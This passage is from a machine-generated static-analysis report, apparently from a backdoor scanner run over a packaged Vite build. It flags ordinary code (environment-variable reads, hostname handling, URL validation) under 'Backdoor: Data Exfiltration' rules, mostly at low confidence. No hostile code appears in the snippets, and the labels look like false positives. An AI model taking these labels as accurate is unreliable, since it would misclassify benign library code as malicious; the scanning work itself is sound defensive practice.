                      "text": "  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                      "markdown": "`  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 33706,
                  "startColumn": 52,
                  "endLine": 33706,
                  "endColumn": 101,
                  "snippet": {
                    "text": "   * @type {Object}\n   *\n   * @prop {String} cwd=process.cwd() Config search start location\n   * @prop {String} env=process.env.NODE_ENV Config Enviroment, will be set to `development` by `postcss-load-config` if `process.env.NODE_ENV` is `undefined`\n   */\n  ctx = Object.assign({\n    cwd: process.cwd(),\n",
                    "rendered": {
                      "text": "   * @type {Object}\n   *\n   * @prop {String} cwd=process.cwd() Config search start location\n   * @prop {String} env=process.env.NODE_ENV Config Enviroment, will be set to `development` by `postcss-load-config` if `process.env.NODE_ENV` is `undefined`\n   */\n  ctx = Object.assign({\n    cwd: process.cwd(),\n",
                      "markdown": "`   * @type {Object}\n   *\n   * @prop {String} cwd=process.cwd() Config search start location\n   * @prop {String} env=process.env.NODE_ENV Config Enviroment, will be set to `development` by `postcss-load-config` if `process.env.NODE_ENV` is `undefined`\n   */\n  ctx = Object.assign({\n    cwd: process.cwd(),\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16415,
                  "startColumn": 28,
                  "endLine": 16415,
                  "endColumn": 66,
                  "snippet": {
                    "text": "\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n",
                    "rendered": {
                      "text": "\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n",
                      "markdown": "`\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 15783,
                  "startColumn": 6,
                  "endLine": 15783,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\t\t\t\t}\n\t\t\t});\n\n\t\t\t// Env-specific initialization logic for debug instances\n\t\t\tif (typeof createDebug.init === 'function') {\n\t\t\t\tcreateDebug.init(debug);\n\t\t\t}\n",
                    "rendered": {
                      "text": "\t\t\t\t}\n\t\t\t});\n\n\t\t\t// Env-specific initialization logic for debug instances\n\t\t\tif (typeof createDebug.init === 'function') {\n\t\t\t\tcreateDebug.init(debug);\n\t\t\t}\n",
                      "markdown": "`\t\t\t\t}\n\t\t\t});\n\n\t\t\t// Env-specific initialization logic for debug instances\n\t\t\tif (typeof createDebug.init === 'function') {\n\t\t\t\tcreateDebug.init(debug);\n\t\t\t}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 96,
                  "startColumn": 17,
                  "endLine": 96,
                  "endColumn": 34,
                  "snippet": {
                    "text": "let argv = process.argv || [],\n\tenv$1 = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env$1 || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env$1 ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n",
                    "rendered": {
                      "text": "let argv = process.argv || [],\n\tenv$1 = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env$1 || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env$1 ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n",
                      "markdown": "`let argv = process.argv || [],\n\tenv$1 = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env$1 || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env$1 ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 65943,
                  "startColumn": 10,
                  "endLine": 65943,
                  "endColumn": 18,
                  "snippet": {
                    "text": "  await httpServerStart(httpServer, {\n    port,\n    strictPort: options.strictPort,\n    host: hostname.host,\n    logger\n  });\n  server.resolvedUrls = await resolveServerUrls(\n",
                    "rendered": {
                      "text": "  await httpServerStart(httpServer, {\n    port,\n    strictPort: options.strictPort,\n    host: hostname.host,\n    logger\n  });\n  server.resolvedUrls = await resolveServerUrls(\n",
                      "markdown": "`  await httpServerStart(httpServer, {\n    port,\n    strictPort: options.strictPort,\n    host: hostname.host,\n    logger\n  });\n  server.resolvedUrls = await resolveServerUrls(\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 65938,
                  "startColumn": 8,
                  "endLine": 65938,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    app.use(indexHtmlMiddleware(distDir, server));\n    app.use(notFoundMiddleware());\n  }\n  const hostname = await resolveHostname(options.host);\n  const port = options.port ?? DEFAULT_PREVIEW_PORT;\n  await httpServerStart(httpServer, {\n    port,\n",
                    "rendered": {
                      "text": "    app.use(indexHtmlMiddleware(distDir, server));\n    app.use(notFoundMiddleware());\n  }\n  const hostname = await resolveHostname(options.host);\n  const port = options.port ?? DEFAULT_PREVIEW_PORT;\n  await httpServerStart(httpServer, {\n    port,\n",
                      "markdown": "`    app.use(indexHtmlMiddleware(distDir, server));\n    app.use(notFoundMiddleware());\n  }\n  const hostname = await resolveHostname(options.host);\n  const port = options.port ?? DEFAULT_PREVIEW_PORT;\n  await httpServerStart(httpServer, {\n    port,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 63071,
                  "startColumn": 10,
                  "endLine": 63071,
                  "endColumn": 18,
                  "snippet": {
                    "text": "  const serverPort = await httpServerStart(httpServer, {\n    port,\n    strictPort: options.strictPort,\n    host: hostname.host,\n    logger: server.config.logger\n  });\n  server._currentServerPort = serverPort;\n",
                    "rendered": {
                      "text": "  const serverPort = await httpServerStart(httpServer, {\n    port,\n    strictPort: options.strictPort,\n    host: hostname.host,\n    logger: server.config.logger\n  });\n  server._currentServerPort = serverPort;\n",
                      "markdown": "`  const serverPort = await httpServerStart(httpServer, {\n    port,\n    strictPort: options.strictPort,\n    host: hostname.host,\n    logger: server.config.logger\n  });\n  server._currentServerPort = serverPort;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 63064,
                  "startColumn": 8,
                  "endLine": 63064,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    throw new Error(\"Cannot call server.listen in middleware mode.\");\n  }\n  const options = server.config.server;\n  const hostname = await resolveHostname(options.host);\n  const configPort = inlinePort ?? options.port;\n  const port = (!configPort || configPort === server._configServerPort ? server._currentServerPort : configPort) ?? DEFAULT_DEV_PORT;\n  server._configServerPort = configPort;\n",
                    "rendered": {
                      "text": "    throw new Error(\"Cannot call server.listen in middleware mode.\");\n  }\n  const options = server.config.server;\n  const hostname = await resolveHostname(options.host);\n  const configPort = inlinePort ?? options.port;\n  const port = (!configPort || configPort === server._configServerPort ? server._currentServerPort : configPort) ?? DEFAULT_DEV_PORT;\n  server._configServerPort = configPort;\n",
                      "markdown": "`    throw new Error(\"Cannot call server.listen in middleware mode.\");\n  }\n  const options = server.config.server;\n  const hostname = await resolveHostname(options.host);\n  const configPort = inlinePort ?? options.port;\n  const port = (!configPort || configPort === server._configServerPort ? server._currentServerPort : configPort) ?? DEFAULT_DEV_PORT;\n  server._configServerPort = configPort;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 61296,
                  "startColumn": 29,
                  "endLine": 61296,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\t    this._server.on('upgrade', function(req, socket, head) { self.ws(req, socket, head); });\n\t  }\n\n\t  this._server.listen(port, hostname);\n\n\t  return this;\n\t};\n",
                    "rendered": {
                      "text": "\t    this._server.on('upgrade', function(req, socket, head) { self.ws(req, socket, head); });\n\t  }\n\n\t  this._server.listen(port, hostname);\n\n\t  return this;\n\t};\n",
                      "markdown": "`\t    this._server.on('upgrade', function(req, socket, head) { self.ws(req, socket, head); });\n\t  }\n\n\t  this._server.listen(port, hostname);\n\n\t  return this;\n\t};\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 61284,
                  "startColumn": 47,
                  "endLine": 61284,
                  "endColumn": 55,
                  "snippet": {
                    "text": "\t  }\n\t};\n\n\tProxyServer.prototype.listen = function(port, hostname) {\n\t  var self    = this,\n\t      closure = function(req, res) { self.web(req, res); };\n\n",
                    "rendered": {
                      "text": "\t  }\n\t};\n\n\tProxyServer.prototype.listen = function(port, hostname) {\n\t  var self    = this,\n\t      closure = function(req, res) { self.web(req, res); };\n\n",
                      "markdown": "`\t  }\n\t};\n\n\tProxyServer.prototype.listen = function(port, hostname) {\n\t  var self    = this,\n\t      closure = function(req, res) { self.web(req, res); };\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60719,
                  "startColumn": 29,
                  "endLine": 60719,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n  // Fix IPv6 hostname\n  if (spread.hostname.startsWith(\"[\")) {\n    spread.hostname = spread.hostname.slice(1, -1);\n  }\n  // Ensure port is a number\n  if (spread.port !== \"\") {\n",
                    "rendered": {
                      "text": "\n  // Fix IPv6 hostname\n  if (spread.hostname.startsWith(\"[\")) {\n    spread.hostname = spread.hostname.slice(1, -1);\n  }\n  // Ensure port is a number\n  if (spread.port !== \"\") {\n",
                      "markdown": "`\n  // Fix IPv6 hostname\n  if (spread.hostname.startsWith(\"[\")) {\n    spread.hostname = spread.hostname.slice(1, -1);\n  }\n  // Ensure port is a number\n  if (spread.port !== \"\") {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60719,
                  "startColumn": 11,
                  "endLine": 60719,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n  // Fix IPv6 hostname\n  if (spread.hostname.startsWith(\"[\")) {\n    spread.hostname = spread.hostname.slice(1, -1);\n  }\n  // Ensure port is a number\n  if (spread.port !== \"\") {\n",
                    "rendered": {
                      "text": "\n  // Fix IPv6 hostname\n  if (spread.hostname.startsWith(\"[\")) {\n    spread.hostname = spread.hostname.slice(1, -1);\n  }\n  // Ensure port is a number\n  if (spread.port !== \"\") {\n",
                      "markdown": "`\n  // Fix IPv6 hostname\n  if (spread.hostname.startsWith(\"[\")) {\n    spread.hostname = spread.hostname.slice(1, -1);\n  }\n  // Ensure port is a number\n  if (spread.port !== \"\") {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60718,
                  "startColumn": 13,
                  "endLine": 60718,
                  "endColumn": 21,
                  "snippet": {
                    "text": "  }\n\n  // Fix IPv6 hostname\n  if (spread.hostname.startsWith(\"[\")) {\n    spread.hostname = spread.hostname.slice(1, -1);\n  }\n  // Ensure port is a number\n",
                    "rendered": {
                      "text": "  }\n\n  // Fix IPv6 hostname\n  if (spread.hostname.startsWith(\"[\")) {\n    spread.hostname = spread.hostname.slice(1, -1);\n  }\n  // Ensure port is a number\n",
                      "markdown": "`  }\n\n  // Fix IPv6 hostname\n  if (spread.hostname.startsWith(\"[\")) {\n    spread.hostname = spread.hostname.slice(1, -1);\n  }\n  // Ensure port is a number\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60702,
                  "startColumn": 68,
                  "endLine": 60702,
                  "endColumn": 76,
                  "snippet": {
                    "text": "}\n\nfunction validateUrl(input) {\n  if (/^\\[/.test(input.hostname) && !/^\\[[:0-9a-f]+\\]$/i.test(input.hostname)) {\n    throw new InvalidUrlError({ input: input.href || input });\n  }\n  if (/^\\[/.test(input.host) && !/^\\[[:0-9a-f]+\\](:\\d+)?$/i.test(input.host)) {\n",
                    "rendered": {
                      "text": "}\n\nfunction validateUrl(input) {\n  if (/^\\[/.test(input.hostname) && !/^\\[[:0-9a-f]+\\]$/i.test(input.hostname)) {\n    throw new InvalidUrlError({ input: input.href || input });\n  }\n  if (/^\\[/.test(input.host) && !/^\\[[:0-9a-f]+\\](:\\d+)?$/i.test(input.host)) {\n",
                      "markdown": "`}\n\nfunction validateUrl(input) {\n  if (/^\\[/.test(input.hostname) && !/^\\[[:0-9a-f]+\\]$/i.test(input.hostname)) {\n    throw new InvalidUrlError({ input: input.href || input });\n  }\n  if (/^\\[/.test(input.host) && !/^\\[[:0-9a-f]+\\](:\\d+)?$/i.test(input.host)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60702,
                  "startColumn": 23,
                  "endLine": 60702,
                  "endColumn": 31,
                  "snippet": {
                    "text": "}\n\nfunction validateUrl(input) {\n  if (/^\\[/.test(input.hostname) && !/^\\[[:0-9a-f]+\\]$/i.test(input.hostname)) {\n    throw new InvalidUrlError({ input: input.href || input });\n  }\n  if (/^\\[/.test(input.host) && !/^\\[[:0-9a-f]+\\](:\\d+)?$/i.test(input.host)) {\n",
                    "rendered": {
                      "text": "}\n\nfunction validateUrl(input) {\n  if (/^\\[/.test(input.hostname) && !/^\\[[:0-9a-f]+\\]$/i.test(input.hostname)) {\n    throw new InvalidUrlError({ input: input.href || input });\n  }\n  if (/^\\[/.test(input.host) && !/^\\[[:0-9a-f]+\\](:\\d+)?$/i.test(input.host)) {\n",
                      "markdown": "`}\n\nfunction validateUrl(input) {\n  if (/^\\[/.test(input.hostname) && !/^\\[[:0-9a-f]+\\]$/i.test(input.hostname)) {\n    throw new InvalidUrlError({ input: input.href || input });\n  }\n  if (/^\\[/.test(input.host) && !/^\\[[:0-9a-f]+\\](:\\d+)?$/i.test(input.host)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60654,
                  "startColumn": 16,
                  "endLine": 60654,
                  "endColumn": 24,
                  "snippet": {
                    "text": "      }, input, options);\n      options.nativeProtocols = nativeProtocols;\n      if (!isString(options.host) && !isString(options.hostname)) {\n        options.hostname = \"::1\";\n      }\n\n      assert.equal(options.protocol, protocol, \"protocol mismatch\");\n",
                    "rendered": {
                      "text": "      }, input, options);\n      options.nativeProtocols = nativeProtocols;\n      if (!isString(options.host) && !isString(options.hostname)) {\n        options.hostname = \"::1\";\n      }\n\n      assert.equal(options.protocol, protocol, \"protocol mismatch\");\n",
                      "markdown": "`      }, input, options);\n      options.nativeProtocols = nativeProtocols;\n      if (!isString(options.host) && !isString(options.hostname)) {\n        options.hostname = \"::1\";\n      }\n\n      assert.equal(options.protocol, protocol, \"protocol mismatch\");\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60653,
                  "startColumn": 55,
                  "endLine": 60653,
                  "endColumn": 63,
                  "snippet": {
                    "text": "        maxBodyLength: exports.maxBodyLength,\n      }, input, options);\n      options.nativeProtocols = nativeProtocols;\n      if (!isString(options.host) && !isString(options.hostname)) {\n        options.hostname = \"::1\";\n      }\n\n",
                    "rendered": {
                      "text": "        maxBodyLength: exports.maxBodyLength,\n      }, input, options);\n      options.nativeProtocols = nativeProtocols;\n      if (!isString(options.host) && !isString(options.hostname)) {\n        options.hostname = \"::1\";\n      }\n\n",
                      "markdown": "`        maxBodyLength: exports.maxBodyLength,\n      }, input, options);\n      options.nativeProtocols = nativeProtocols;\n      if (!isString(options.host) && !isString(options.hostname)) {\n        options.hostname = \"::1\";\n      }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60416,
                  "startColumn": 14,
                  "endLine": 60416,
                  "endColumn": 22,
                  "snippet": {
                    "text": "  if (options.host) {\n    // Use hostname if set, because it has precedence\n    if (!options.hostname) {\n      options.hostname = options.host;\n    }\n    delete options.host;\n  }\n",
                    "rendered": {
                      "text": "  if (options.host) {\n    // Use hostname if set, because it has precedence\n    if (!options.hostname) {\n      options.hostname = options.host;\n    }\n    delete options.host;\n  }\n",
                      "markdown": "`  if (options.host) {\n    // Use hostname if set, because it has precedence\n    if (!options.hostname) {\n      options.hostname = options.host;\n    }\n    delete options.host;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60415,
                  "startColumn": 17,
                  "endLine": 60415,
                  "endColumn": 25,
                  "snippet": {
                    "text": "  // eliminate the host property to avoid confusion.\n  if (options.host) {\n    // Use hostname if set, because it has precedence\n    if (!options.hostname) {\n      options.hostname = options.host;\n    }\n    delete options.host;\n",
                    "rendered": {
                      "text": "  // eliminate the host property to avoid confusion.\n  if (options.host) {\n    // Use hostname if set, because it has precedence\n    if (!options.hostname) {\n      options.hostname = options.host;\n    }\n    delete options.host;\n",
                      "markdown": "`  // eliminate the host property to avoid confusion.\n  if (options.host) {\n    // Use hostname if set, because it has precedence\n    if (!options.hostname) {\n      options.hostname = options.host;\n    }\n    delete options.host;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60414,
                  "startColumn": 11,
                  "endLine": 60414,
                  "endColumn": 19,
                  "snippet": {
                    "text": "  // but the url module interprets host as hostname plus port,\n  // eliminate the host property to avoid confusion.\n  if (options.host) {\n    // Use hostname if set, because it has precedence\n    if (!options.hostname) {\n      options.hostname = options.host;\n    }\n",
                    "rendered": {
                      "text": "  // but the url module interprets host as hostname plus port,\n  // eliminate the host property to avoid confusion.\n  if (options.host) {\n    // Use hostname if set, because it has precedence\n    if (!options.hostname) {\n      options.hostname = options.host;\n    }\n",
                      "markdown": "`  // but the url module interprets host as hostname plus port,\n  // eliminate the host property to avoid confusion.\n  if (options.host) {\n    // Use hostname if set, because it has precedence\n    if (!options.hostname) {\n      options.hostname = options.host;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60411,
                  "startColumn": 43,
                  "endLine": 60411,
                  "endColumn": 51,
                  "snippet": {
                    "text": "  }\n\n  // Since http.request treats host as an alias of hostname,\n  // but the url module interprets host as hostname plus port,\n  // eliminate the host property to avoid confusion.\n  if (options.host) {\n    // Use hostname if set, because it has precedence\n",
                    "rendered": {
                      "text": "  }\n\n  // Since http.request treats host as an alias of hostname,\n  // but the url module interprets host as hostname plus port,\n  // eliminate the host property to avoid confusion.\n  if (options.host) {\n    // Use hostname if set, because it has precedence\n",
                      "markdown": "`  }\n\n  // Since http.request treats host as an alias of hostname,\n  // but the url module interprets host as hostname plus port,\n  // eliminate the host property to avoid confusion.\n  if (options.host) {\n    // Use hostname if set, because it has precedence\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60410,
                  "startColumn": 51,
                  "endLine": 60410,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    options.headers = {};\n  }\n\n  // Since http.request treats host as an alias of hostname,\n  // but the url module interprets host as hostname plus port,\n  // eliminate the host property to avoid confusion.\n  if (options.host) {\n",
                    "rendered": {
                      "text": "    options.headers = {};\n  }\n\n  // Since http.request treats host as an alias of hostname,\n  // but the url module interprets host as hostname plus port,\n  // eliminate the host property to avoid confusion.\n  if (options.host) {\n",
                      "markdown": "`    options.headers = {};\n  }\n\n  // Since http.request treats host as an alias of hostname,\n  // but the url module interprets host as hostname plus port,\n  // eliminate the host property to avoid confusion.\n  if (options.host) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
